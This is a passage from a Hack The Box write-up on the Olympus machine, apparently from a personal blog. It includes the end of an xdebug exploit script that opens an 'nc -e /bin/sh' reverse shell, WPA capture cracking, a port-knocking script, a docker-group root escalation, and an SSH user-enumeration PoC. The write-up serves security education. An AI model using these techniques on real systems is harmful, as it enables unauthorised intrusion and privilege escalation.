                <span class="n">timeout</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span>
<span class="k">except</span><span class="p">:</span>
    <span class="k">pass</span>

<span class="c1"># Catch callback
</span><span class="n">conn</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">accept</span><span class="p">()</span>
<span class="n">client_data</span> <span class="o">=</span> <span class="n">conn</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[+] Connection received from {}:{} on port {}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">addr</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">addr</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">local_port</span><span class="p">))</span>
<span class="n">cmd</span> <span class="o">=</span> <span class="sh">'</span><span class="s">system(</span><span class="sh">"</span><span class="s">nc -e /bin/sh {} {}</span><span class="sh">"</span><span class="s">)</span><span class="sh">'</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">).</span><span class="nf">encode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[*] Sending command get shell on port {}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">port</span><span class="p">))</span>
<span class="n">conn</span><span class="p">.</span><span class="nf">sendall</span><span class="p">((</span><span class="sh">'</span><span class="s">eval -i 1 -- %s</span><span class="se">\x00</span><span class="sh">'</span> <span class="o">%</span> <span class="nf">b64encode</span><span class="p">(</span><span class="n">cmd</span><span class="p">).</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">)).</span><span class="nf">encode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">))</span>

<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[*] Cleaning up. Should have callback</span><span class="sh">"</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
<span class="n">conn</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
</code></pre></div></div>

<p>Now, to get a shell, with nc listener going, run the script:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>./get_olympic_www_shell.py 443
<span class="go">[!] Have nc listening on 443
[*] Starting listener on 0.0.0.0:9000
[+] Listening...
[*] Sending request to tip xdebug
[+] Connection received from 10.10.10.83:36262 on port 9000
[*] Sending command get shell on port 443
[*] Cleaning up. Should have callback
</span></code></pre></div></div>

<p>And get a callback:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>nc <span class="nt">-lvnp</span> 443
<span class="go">listening on [any] 443 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.83] 48372
</span><span class="gp">‍</span><span class="nb">id</span>
<span class="go">uid=33(www-data) gid=33(www-data) groups=33(www-data)
</span></code></pre></div></div>

<p>We now have access to what we’ll later find is called the the Create container.</p>

<h2 id="pivot-to-olympia-container---shell-as-icarus">Pivot to Olympia Container - Shell as icarus</h2>

<h3 id="enumeration-of-create">Enumeration of Create</h3>

<p>It’s quickly clear that this is a stripped down environment, likely a container:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">‍</span>which python
<span class="go">
</span><span class="gp">‍</span>which python3
<span class="go">
</span><span class="gp">‍</span><span class="nb">hostname</span>
<span class="go">f00ba96171c5

</span><span class="gp">‍</span>ifconfig
<span class="go">eth0      Link encap:Ethernet  HWaddr 02:42:ac:14:00:02
          inet addr:172.20.0.2  Bcast:172.20.255.255  Mask:255.255.0.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:3149050 errors:0 dropped:0 overruns:0 frame:0
          TX packets:2384513 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:421530652 (402.0 MiB)  TX bytes:423441702 (403.8 MiB)

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:36092 errors:0 dropped:0 overruns:0 frame:0
          TX packets:36092 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1
          RX bytes:2823261 (2.6 MiB)  TX bytes:2823261 (2.6 MiB)

</span><span class="gp">‍</span>arp <span class="nt">-a</span>
<span class="go">? (172.20.0.1) at 02:42:e3:e6:86:2f [ether] on eth0

</span><span class="gp">‍</span>netstat <span class="nt">-anop</span> | <span class="nb">grep </span>LISTEN
<span class="go">tcp        0      0 127.0.0.11:36933        0.0.0.0:*               LISTEN      -                off (0.00/0/0)
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                off (0.00/0/0)
</span></code></pre></div></div>

<p>There’s only one user on the box, <code class="language-plaintext highlighter-rouge">zeus</code>, and the only thing in the homedir is <code class="language-plaintext highlighter-rouge">airgeddon</code>, a tool for WiFi sniffing. Inside <code class="language-plaintext highlighter-rouge">/home/zeus/airgeddon/captured</code> is a pcap and a note:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">‍</span><span class="nb">pwd</span>
<span class="go">/home/zeus/airgeddon/captured
</span><span class="gp">‍</span><span class="nb">ls</span> <span class="nt">-la</span>
<span class="go">total 304
drwxr-xr-x 1 zeus zeus   4096 Apr  8 17:31 .
drwxr-xr-x 1 zeus zeus   4096 Apr  8 10:56 ..
-rw-r--r-- 1 zeus zeus 297917 Apr  8 12:48 captured.cap
-rw-r--r-- 1 zeus zeus     57 Apr  8 17:30 papyrus.txt

</span><span class="gp">‍</span><span class="nb">cat </span>papyrus.txt
<span class="go">Captured while flying. I'll banish him to Olympia - Zeus
</span></code></pre></div></div>

<h3 id="cracking-80211">Cracking 802.11</h3>

<p>I’ll pull the cap file back to my workstation using nc, and then use <code class="language-plaintext highlighter-rouge">aircrack-ng</code> to get the wifi password from the pcap. To do so, we’ll need the SSID, which we find in the first packet:</p>

<p><img src="https://0xdfimages.gitlab.io/img/1526933143270.png" alt="1526933143270" /></p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>aircrack-ng <span class="nt">-e</span> Too_cl0se_to_th3_Sun <span class="nt">-w</span> /usr/share/wordlists/rockyou.txt olympia_loot/caputred.cap
<span class="go">
                                 Aircrack-ng 1.2

      [00:12:44] 5306144/9822768 keys tested (7499.83 k/s)

      Time left: 10 minutes, 2 seconds                          54.02%

                        KEY FOUND! [ flightoficarus ]


      Master Key     : FA C9 FB 75 B7 7E DC 86 CC C0 D5 38 88 75 B8 5A
                       88 3B 75 31 D9 C3 23 C8 68 3C DB FA 0F 67 3F 48

      Transient Key  : 46 7D FD D8 1A E5 1A 98 50 C8 DD 13 26 E7 32 7C
                       DE E7 77 4E 83 03 D9 24 74 81 30 84 AD AD F8 10
                       21 62 1F 60 15 02 0C 5C 1C 84 60 FA 34 DE C0 4F
                       35 F6 4F 03 A2 0F 8F 6F 5E 20 05 27 E1 73 E0 73

      EAPOL HMAC     : AC 1A 73 84 FB BF 75 9C 86 CF 5B 5A F4 8A 4C 38
</span></code></pre></div></div>

<h3 id="ssh-as-icarus">SSH as icarus</h3>

<p>Back at the original <code class="language-plaintext highlighter-rouge">nmap</code>, there was ssh open on port 2222. With some new passwords in hand, try logging in. Both zeus and root failed with both “flightoficarus” and “Too_cl0se_to_th3_Sun”. But there’s be several hints here that we’re talking about <a href="https://en.wikipedia.org/wiki/Icarus">Icarus</a>:</p>

<ul>
  <li>The 802.11 password, “flightoficarus”</li>
  <li>The network name “Too_cl0se_to_th3_Sun”</li>
  <li>We’ll see later that the first container was named Create, and Icarus and his father escate from Create</li>
</ul>

<p>If we ssh as icarus with password <code class="language-plaintext highlighter-rouge">Too_cl0se_to_th3_Sun</code> worked!</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>ssh icarus@10.10.10.83 <span class="nt">-p</span> 2222
<span class="gp">icarus@10.10.10.83's password:</span><span class="w">
</span><span class="go">Last login: Sun Apr 15 16:44:40 2018 from 10.10.14.4
</span><span class="gp">icarus@620b296204a3:~$</span><span class="w"> </span><span class="nb">pwd</span>
<span class="go">/home/icarus
</span></code></pre></div></div>

<p>We now have access to what we’ll later find is called the Olympia container.</p>

<h2 id="pivot-to-hades--olympus---shell-as-prometheus">Pivot to Hades / Olympus - Shell as prometheus</h2>

<h3 id="enumeration-of--olympia">Enumeration of  Olympia</h3>

<p>This box is pretty stripped down, matching our suspicion that it’s a container:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">icarus@620b296204a3:~$ </span>which nc
<span class="gp">icarus@620b296204a3:~$ </span>which python
<span class="gp">icarus@620b296204a3:~$ </span>which python3
<span class="go">/usr/bin/python3
</span><span class="gp">icarus@620b296204a3:~$ </span>which curl
<span class="gp">icarus@620b296204a3:~$ </span>which wget
<span class="go">/usr/bin/wget
</span><span class="gp">icarus@620b296204a3:~$ </span>which ifconfig
<span class="gp">icarus@620b296204a3:~$ </span>which arp
<span class="gp">icarus@620b296204a3:~$ </span>which ping
</code></pre></div></div>

<p>This box is in a new subnet:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">icarus@620b296204a3:~$ </span><span class="nb">cat</span> /proc/net/fib_trie | <span class="nb">grep</span> <span class="nt">-B1</span> <span class="s2">"32 host LOCAL"</span>
<span class="go">           |-- 127.0.0.1
              /32 host LOCAL
--
           |-- 172.19.0.2
              /32 host LOCAL
--
           |-- 127.0.0.1
              /32 host LOCAL
--
           |-- 172.19.0.2
              /32 host LOCAL
</span><span class="gp">icarus@620b296204a3:~$ </span><span class="nb">cat</span> /proc/net/arp
<span class="go">IP address       HW type     Flags       HW address            Mask     Device
172.19.0.1       0x1         0x2         02:42:87:01:fe:61     *        eth0

</span><span class="gp">icarus@620b296204a3:~$ </span><span class="nb">cat</span> /proc/net/tcp
<span class="go">  sl  local_address rem_address   st tx_queue rx_queue tr tm-&gt;when retrnsmt   uid  timeout inode
   0: 0B00007F:9ACD 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 15121 1 ffff9d99fba547c0 100 0 0 10 0
   1: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 15329 1 ffff9d99faae8000 100 0 0 10 0
   2: 020013AC:0016 630F0A0A:870A 01 00000024:00000000 01:0000001E 00000000     0        0 61087 4 ffff9d99f9f2f000 30 5 31 10 -1
</span></code></pre></div></div>

<p>So the host is listening on 22 (ssh) and on localhost:39629.</p>

<p>In the home directory, there’s a note:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">icarus@620b296204a3:~$ </span><span class="nb">cat </span>help_of_the_gods.txt
<span class="go">
Athena goddess will guide you through the dark...

Way to Rhodes...
ctfolympus.htb
</span></code></pre></div></div>

<h3 id="revisiting-zone-transfer">Revisiting Zone Transfer</h3>

<p>Back in the initial enumeration phase, we had tried to do a zone transfer, but not come up with anything of interest. With the new subdomain, try a zone transfer again, and this time get a ton of information:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>dig axfr @10.10.10.83 ctfolympus.htb
<span class="go">
; &lt;&lt;&gt;&gt; DiG 9.11.3-1-Debian &lt;&lt;&gt;&gt; axfr @10.10.10.83 ctfolympus.htb
; (1 server found)
;; global options: +cmd
ctfolympus.htb.         86400   IN      SOA     ns1.ctfolympus.htb. ns2.ctfolympus.htb. 2018042301 21600 3600 604800 86400
ctfolympus.htb.         86400   IN      TXT     "prometheus, open a temporal portal to Hades (3456 8234 62431) and St34l_th3_F1re!"
ctfolympus.htb.         86400   IN      A       192.168.0.120
ctfolympus.htb.         86400   IN      NS      ns1.ctfolympus.htb.
ctfolympus.htb.         86400   IN      NS      ns2.ctfolympus.htb.
ctfolympus.htb.         86400   IN      MX      10 mail.ctfolympus.htb.
crete.ctfolympus.htb.   86400   IN      CNAME   ctfolympus.htb.
hades.ctfolympus.htb.   86400   IN      CNAME   ctfolympus.htb.
mail.ctfolympus.htb.    86400   IN      A       192.168.0.120
ns1.ctfolympus.htb.     86400   IN      A       192.168.0.120
ns2.ctfolympus.htb.     86400   IN      A       192.168.0.120
rhodes.ctfolympus.htb.  86400   IN      CNAME   ctfolympus.htb.
RhodesColossus.ctfolympus.htb. 86400 IN TXT     "Here lies the great Colossus of Rhodes"
www.ctfolympus.htb.     86400   IN      CNAME   ctfolympus.htb.
ctfolympus.htb.         86400   IN      SOA     ns1.ctfolympus.htb. ns2.ctfolympus.htb. 2018042301 21600 3600 604800 86400
;; Query time: 95 msec
;; SERVER: 10.10.10.83#53(10.10.10.83)
;; WHEN: Mon May 21 21:00:57 EDT 2018
;; XFR size: 15 records (messages 1, bytes 475)
</span></code></pre></div></div>

<h3 id="port-knocking">Port Knocking</h3>

<p>The note in the zone transfer gives a hint at a way forward: <code class="language-plaintext highlighter-rouge">prometheus, open a temporal portal to Hades (3456 8234 62431) and St34l_th3_F1re!</code></p>

<p>We noticed in the initial nmap that port 22 came back filtered. I’ll hypothesize that those three numbers are a clue for port knocking, and they could open ssh. I’ll also notice that the note was to prometheus (username?), and that the last bit looks like a password.</p>

<p>Wrote a short script to knock, <code class="language-plaintext highlighter-rouge">open_portal_to_Hades.py</code>:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
</span>
<span class="kn">from</span> <span class="n">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="n">pyperclip</span>

<span class="k">def</span> <span class="nf">SendSyn</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">):</span>
    <span class="n">ip</span><span class="o">=</span><span class="nc">IP</span><span class="p">(</span><span class="n">src</span><span class="o">=</span><span class="sh">"</span><span class="s">10.10.15.99</span><span class="sh">"</span><span class="p">,</span> <span class="n">dst</span><span class="o">=</span><span class="n">ip</span><span class="p">)</span>
    <span class="n">SYN</span><span class="o">=</span><span class="nc">TCP</span><span class="p">(</span><span class="n">sport</span><span class="o">=</span><span class="mi">7777</span><span class="p">,</span> <span class="n">dport</span><span class="o">=</span><span class="n">port</span><span class="p">,</span> <span class="n">flags</span><span class="o">=</span><span class="sh">"</span><span class="s">S</span><span class="sh">"</span><span class="p">,</span> <span class="n">seq</span><span class="o">=</span><span class="mi">12345</span><span class="p">)</span>
    <span class="nf">send</span><span class="p">(</span><span class="n">ip</span><span class="o">/</span><span class="n">SYN</span><span class="p">)</span>

<span class="n">ports</span> <span class="o">=</span> <span class="p">[</span><span class="mi">3456</span><span class="p">,</span> <span class="mi">8234</span><span class="p">,</span> <span class="mi">62431</span><span class="p">]</span>

<span class="k">for</span> <span class="n">port</span> <span class="ow">in</span> <span class="n">ports</span><span class="p">:</span>
    <span class="nc">SendSyn</span><span class="p">(</span><span class="sh">"</span><span class="s">10.10.10.83</span><span class="sh">"</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>

<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[+] Portal should be open.</span><span class="se">\n</span><span class="s">Run:</span><span class="se">\n</span><span class="s">ssh prometheus@10.10.10.83</span><span class="se">\n</span><span class="s">password: St34l_th3_F1re!</span><span class="sh">"</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[*] Putting password on system clipboard. Ctrl + Shift + v to paste</span><span class="sh">"</span><span class="p">)</span>
<span class="n">pyperclip</span><span class="p">.</span><span class="nf">copy</span><span class="p">(</span><span class="sh">'</span><span class="s">St34l_th3_F1re!</span><span class="se">\n</span><span class="sh">'</span><span class="p">)</span>
</code></pre></div></div>

<p>To demonstrate the script, I’ll start with an nmap showing ssh on 22 filtered:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>nmap <span class="nt">-p-</span> <span class="nt">-sT</span> <span class="nt">--min-rate</span> 5000 10.10.10.83
<span class="go">Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-21 21:15 EDT
Nmap scan report for 10.10.10.83
Host is up (0.095s latency).
Not shown: 65531 closed ports
PORT     STATE    SERVICE
22/tcp   filtered ssh
53/tcp   open     domain
80/tcp   open     http
2222/tcp open     EtherNetIP-1
</span></code></pre></div></div>

<p>Now, run the script:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">
</span><span class="gp">root@kali# </span>./open_portal_to_Hades.py
<span class="c">.
</span><span class="go">Sent 1 packets.
</span><span class="c">.
</span><span class="go">Sent 1 packets.
</span><span class="c">.
</span><span class="go">Sent 1 packets.
[+] Portal should be open.
Run:
ssh prometheus@10.10.10.83
password: St34l_th3_F1re!
</span></code></pre></div></div>

<p>And check nmap again… ssh is open:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">Nmap done: 1 IP address (1 host up) scanned in 15.81 seconds
</span><span class="gp">root@kali# </span>nmap <span class="nt">-p-</span> <span class="nt">-sT</span> <span class="nt">--min-rate</span> 5000 10.10.10.83
<span class="go">Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-21 21:15 EDT
Nmap scan report for 10.10.10.83
Host is up (0.095s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
80/tcp   open  http
2222/tcp open  EtherNetIP-1
</span></code></pre></div></div>

<p>Now we can ssh in, trying the credentials from the txt record:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>./open_portal_to_Hades.py <span class="o">&amp;&amp;</span> ssh prometheus@10.10.10.83
<span class="c">.
</span><span class="go">Sent 1 packets.
</span><span class="c">.
</span><span class="go">Sent 1 packets.
</span><span class="c">.
</span><span class="go">Sent 1 packets.
[+] Portal should be open.
Run:
ssh prometheus@10.10.10.83
password: St34l_th3_F1re!
prometheus@10.10.10.83's password:

Welcome to

    )         (
 ( /(     )   )\ )   (
 )\()) ( /(  (()/(  ))\ (
((_)\  )(_))  ((_))/((_))\
| |(_)((_)_   _| |(_)) ((_)
| ' \ / _` |/ _` |/ -_)(_-&lt;
|_||_|\__,_|\__,_|\___|/__/

</span><span class="gp">prometheus@olympus:~$</span><span class="w">
</span></code></pre></div></div>

<h3 id="usertxt">user.txt</h3>

<p>Finally, in prometheus’ home dir, we find user.txt:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">prometheus@olympus:~$ </span><span class="nb">ls</span>
<span class="go">msg_of_gods.txt  user.txt
</span><span class="gp">prometheus@olympus:~$ </span><span class="nb">wc</span> <span class="nt">-c</span> user.txt
<span class="go">33 user.txt
</span><span class="gp">prometheus@olympus:~$ </span><span class="nb">cat </span>user.txt
<span class="go">8aa18519...
</span></code></pre></div></div>

<h2 id="privesc-to-root-file-system-access">Privesc to root File System Access</h2>

<h3 id="enumeration-of-olympus">Enumeration of Olympus</h3>

<p>prometheus is the only non-root user on the box. In that homedir, there’s a note:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">prometheus@olympus:~$ </span><span class="nb">cat </span>msg_of_gods.txt
<span class="go">
Only if you serve well to the gods, you'll be able to enter into the

      _
 ___ | | _ _ ._ _ _  ___  _ _  ___
/ . \| || | || ' ' || . \| | |&lt;_-&lt;
\___/|_|`_. ||_|_|_||  _/`___|/__/
        &lt;___'       |_|


</span></code></pre></div></div>

<p>Luckily, prometheus is in the docker group:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">prometheus@olympus:/var/run$ </span><span class="nb">groups</span>
<span class="go">prometheus cdrom floppy audio dip video plugdev netdev bluetooth docker

</span><span class="gp">prometheus@olympus:/var/run$ </span>docker ps
<span class="go">CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                                    NAMES
0207645a2f24        crete               "docker-php-entrypoi…"   2 hours ago         Up 2 hours          80/tcp                                   dreamy_sammet
f00ba96171c5        crete               "docker-php-entrypoi…"   6 weeks ago         Up 3 hours          0.0.0.0:80-&gt;80/tcp                       crete
ce2ecb56a96e        rodhes              "/etc/bind/entrypoin…"   6 weeks ago         Up 3 hours          0.0.0.0:53-&gt;53/tcp, 0.0.0.0:53-&gt;53/udp   rhodes
620b296204a3        olympia             "/usr/sbin/sshd -D"      6 weeks ago         Up 3 hours          0.0.0.0:2222-&gt;22/tcp                     olympia

</span></code></pre></div></div>

<p>Linenum agrees that this is interesting:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">...[snip]...
We're a member of the (docker) group - could possibly misuse these rights!:
uid=1000(prometheus) gid=1000(prometheus) groups=1000(prometheus),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),111(bluetooth),999(docker)
...[snip]...
</span></code></pre></div></div>

<h3 id="root-file-system-access-via-docker-group">root File System Access Via docker Group</h3>

<p>To get access to the entire local file system, we’ll use docker to run one of the images, and we’re going to mount the local file system root in that image, and give ourselves a shell to that system.</p>

<p><code class="language-plaintext highlighter-rouge">docker run</code> looks like this: <code class="language-plaintext highlighter-rouge">$ docker run [OPTIONS] IMAGE[:TAG|@DIGEST][COMMAND] [ARG...]</code> <a href="https://docs.docker.com/engine/reference/run/#general-form">ref</a></p>

<p>So we’ll run <code class="language-plaintext highlighter-rouge">docker run -v /:/hostOS -i -t  rodhes bash</code>:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">-v /:/hostOS</code> - mount the host’s <code class="language-plaintext highlighter-rouge">/</code> as <code class="language-plaintext highlighter-rouge">/hostOS</code> inside the image</li>
  <li><code class="language-plaintext highlighter-rouge">-i</code> - interactive</li>
  <li><code class="language-plaintext highlighter-rouge">-t</code> - create a tty</li>
  <li><code class="language-plaintext highlighter-rouge">rodhes</code> - the name of the image to run, got from <code class="language-plaintext highlighter-rouge">docker ps above</code>
    <ul>
      <li>I picked this one because it doesn’t have shell access by others, so it’s less likely to accidentally give the root flag to someone else</li>
    </ul>
  </li>
  <li><code class="language-plaintext highlighter-rouge">bash</code> - command to run</li>
</ul>

<p>And this does give root access:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">prometheus@olympus:/dev/shm$ </span>docker run <span class="nt">-v</span> /:/hostOS <span class="nt">-i</span> <span class="nt">-t</span>  rodhes bash
<span class="go">cat: /etc/hostip: No such file or directory

</span><span class="gp">root@6e53f07f626a:/# </span><span class="nb">id</span>
<span class="go">uid=0(root) gid=0(root) groups=0(root)

</span><span class="gp">root@6e53f07f626a:/# </span><span class="nb">cd</span> /hostOS/
<span class="go">
</span><span class="gp">root@6e53f07f626a:/hostOS# </span><span class="nb">ls</span>
<span class="go">bin  boot  dev  etc  home  initrd.img  initrd.img.old  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var  vmlinuz  vmlinuz.old
</span></code></pre></div></div>

<h3 id="roottxt">root.txt</h3>

<p>And with full read access to the file system we can grab the flag:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@6e53f07f626a:/hostOS/root# </span><span class="nb">wc</span> <span class="nt">-c</span> root.txt
<span class="go">33 root.txt

</span><span class="gp">root@6e53f07f626a:/hostOS/root# </span><span class="nb">cat </span>root.txt
<span class="go">aba48699...
</span></code></pre></div></div>

<h2 id="commentary">Commentary</h2>

<p>This was a really cool box, and in having you jump from container to container, providing different interesting challenges like zone transfers and 802.11 cracking that aren’t typically seen in HTB. And it does it in a way that’s interesting but on the not insanely difficult side of the HTB difficulty spectrum.</p>

<p>The one part of the box that I think put most people off about Olymus, and kept it from being a really great box, was the pivot from getting SSID from the capture to ssh access as icarus. Guessing is often a part of hacking, but, in my opinion, using the SSID as the SSH password was a bit of a stretch. Even having a shared WiFi / SSH password would have been better. And some people were frustrated with getting to the user name of icarus. IppSec said he’s going to use <a href="https://blog.nviso.be/2018/08/21/openssh-user-enumeration-vulnerability-a-close-look/">CVE-2018-15473</a> and a list of Greek mythological figures to find the username, which is pretty cool (as always, you should watch <a href="https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA">his videos</a>).  I won’t go into detail here, but, using <a href="https://github.com/Rhynorater/CVE-2018-15473-Exploit/blob/master/sshUsernameEnumExploit.py">this POC</a>, it does work:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>./sshUsernameEnumExploit.py <span class="nt">--port</span> 2222 <span class="nt">--username</span> icarus 10.10.10.83
<span class="go">icarus is a valid user!
</span><span class="gp">root@kali# </span>./sshUsernameEnumExploit.py <span class="nt">--port</span> 2222 <span class="nt">--username</span> icaruss 10.10.10.83
<span class="go">icaruss is not a valid user!
</span></code></pre></div></div>

<p>All of that said, I really enjoyed this box, and it’s clear path of interesting challenges.</p>

      </div>
    </div>
  
  </div><a class="u-url" href="/2018/09/22/htb-olympus.html" hidden></a>
</article>

      </div>
    </main>
<footer class="site-footer h-card">

  <div class="wrapper">

    <h2 data-toc-skip class="footer-heading">0xdf hacks stuff</h2>

    <div class="footer-col-wrapper">
      <div class="footer-col footer-col-1">
        <ul class="contact-list">
          <li class="p-name">0xdf hacks stuff
</li><li><a class="u-email" href="mailto:0xdf.223@gmail.com">0xdf.223@gmail.com</a></li></ul>
      </div>

      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://www.twitter.com/0xdf_"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">0xdf_</span></a></li><!--<li><a href="https://mm.netsecfocus.com/nsf/messages/@oxdf"><img class="svg-icon" src="/assets/icons/mattermost-icon-128.png" alt="NSF" /><span class="username">oxdf</span></a></li>--><li><a href="https://youtube.com/channel/UChO9OAH57Flz35RRX__E25A"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#youtube"></use></svg> <span class="username">0xdf</span></a></li><li><a href="/feed.xml"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#rss"></use></svg> <span>feed</span></a></li><li class="bmc"><a href="https://app.hackthebox.com/users/profile/4935"><img class="svg-icon bmc" src="/assets/icons/htb-favicon.png" alt="HTB" /><span class="username">0xdf</span></a></li><li class="bmc"><a rel="me" href="https://infosec.exchange/@0xdf"><img class="svg-icon bmc" src="/assets/icons/mastodon.svg" alt="Mastodon" /><span class="username">@0xdf@infosec.exchange</span></a></li></ul>
</div>

      <div class="footer-col footer-col-3">
        <p>CTF solutions, malware analysis, home lab development</p>
        <link href="https://fonts.googleapis.com/css?family=Cookie"
rel="stylesheet"><a class="bmc-button" target="_blank" href="https://www.buymeacoffee.com/0xdf"><img src="https://cdn.buymeacoffee.com/buttons/bmc-new-btn-logo.svg" alt="Buy me a coffee"><span style="margin-left:15px;font-size:28px !important;">Buy me a coffee</span></a>
      </div>
    </div>

  </div>


  <script src="/assets/js/jquery-3.6.0.min.js" integrity="sha384-vtXRMe3mGCbOeY7l30aIg8H9p3GdeSe4IFlP6G8JMa7o7lXvnz3GFKzPxzJdPfGK" crossorigin="anonymous"></script>
  <script src="/assets/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
  <script src="/assets/js/bootstrap-toc.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.7/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
  
  <script src="/assets/js/collapsable.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/mermaid@10.6.1/dist/mermaid.min.js"></script>
<script>
  $(document).ready(function () {
    mermaid.initialize({
      startOnLoad:true,
      theme: "default",
    });
    window.mermaid.init(undefined, document.querySelectorAll('.language-mermaid'));
  });
</script>

  <script src="/assets/js/fix_mermaid.js"></script>


  <!-- Twitter universal website tag code -->
  <script>
    !function(e,t,n,s,u,a){e.twq||(s=e.twq=function(){s.exe?s.exe.apply(s,arguments):s.queue.push(arguments);
     },s.version='1.1',s.queue=[],u=t.createElement(n),u.async=!0,u.src='//static.ads-twitter.com/uwt.js',
     a=t.getElementsByTagName(n)[0],a.parentNode.insertBefore(u,a))}(window,document,'script');
    // Insert Twitter Pixel ID and Standard Event data below
    twq('init','o42o1');
    twq('track','PageView');
  </script>
  <!-- End Twitter universal website tag code -->
</footer>
</body>

</html>

